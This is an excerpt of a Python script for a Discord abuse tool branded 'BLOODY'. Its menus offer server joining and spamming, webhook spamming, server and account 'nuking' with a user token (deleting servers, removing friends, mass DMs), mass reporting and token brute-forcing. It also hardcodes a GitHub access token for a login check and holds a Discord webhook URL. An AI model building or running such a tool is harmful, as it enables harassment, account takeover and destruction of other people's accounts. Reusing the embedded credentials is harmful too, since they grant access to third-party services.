...
def spammer():
    ...
    print('')
    print("                              Made By !chXrst#4672")
    print('')
    print('')
    print('[1] Joiner                     [7] Webhook spammer')
    print('[2] Leaver                     [8] Nuker')
    print('[3] Spammer                    [9] Account Nuker')
    print('[4] Friend                     [10] MassReport')
    print('[5] Typing spammer             [11] Token Bruteforce')
    print('[6] Token checker              [12] About')
    print('\n'*2)
    print(f'╔═[{username}@BLOODY]')
    ...
    if choice == 5:
        ...
        print('                                 ░               ░  ░      ░         ░     ░  ░  ░     ')
        print('                                                                                       ')
        print('*WARNING : This sends via your MAIN ACCOUNT. it uses a paid module to send the messages from your pc.')
    ...
    if choice == 9:
        ...
        tokenn = input("Token: ")
        print('[1] Server spam                                          [5] Leave all servers')
        print('[2] Remove all friends                                   [6] Close all DMs')
        print('[3] Block all friends                                    [7] Send mass DM')
        print('[4] Spam settings                                        [8] Delete all personal Servers')
    ...
    if choice == 12:
        print('Login System Creds To :Tonka Jahari#6779,  Programming Creds To :!chXrst#4672')
...
def Check():
    ...
    g = Github("010Sam010", "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")
    ...
    if f'<< user - {username} ? password - {password} ? locked = False >>' in strip3:
        Locked = False
        perms = True
    elif f'<< user - {username} ? password - {password} ? locked = True >>' in strip3:
        ...
        print('    ░  ░   ░ ░ ░ ░     ░  ░     ░  ░  ░    ')
        print('               ░                    ░      ')
        print('An Administrator Has Locked Your Account. ')
        ...
        print('   ░  ░  ░       ░        ░ ░    ░     ')
        print('                                       ')
        print('Whoops. Somethings Gone Wrong, Wrong   ')
        print('Credentials Perhaps?                   ')
        perms = False
    ...
    url = "https://discord.com/api/webhooks/932287043445342238/6lqfznX6FmfMi5RYOovgprM7ojLuTvkEi8k3J3bN9rk7_T8nMv79fHfKmVzCE7sHTRNf" 
